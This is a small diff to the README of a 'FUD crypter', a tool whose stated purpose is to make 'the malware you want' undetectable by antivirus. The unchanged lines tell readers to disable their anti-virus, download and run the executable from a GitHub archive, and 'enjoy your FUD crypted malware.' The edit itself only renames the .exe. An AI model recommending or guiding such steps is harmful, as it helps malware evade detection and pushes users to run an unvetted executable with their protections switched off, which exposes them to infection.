@@ -29,7 +29,7 @@ Usage/Install
 - Before downloading you will need to disable your Anti-Virus, otherwise it sends your crypted file to the Anti-Virus company
 - Click <a href="https://github.com/DimitriVolkov1/GHOST-FUD-CRYPTER/archive/refs/heads/main.zip">HERE</a> to download
 - EXTRACT before using otherwise the script will not work correctly
-- Run the .exe 
+- Run GHOST FUD CRYPTER.exe 
 - Set the input (The path to the malware you want to make undetectable) and ouput the directory where you want to file to be generated
 - Click "! CRYPT NOW !" button, the process may take few minute.
 - Finally enjoy your FUD crypted malware!
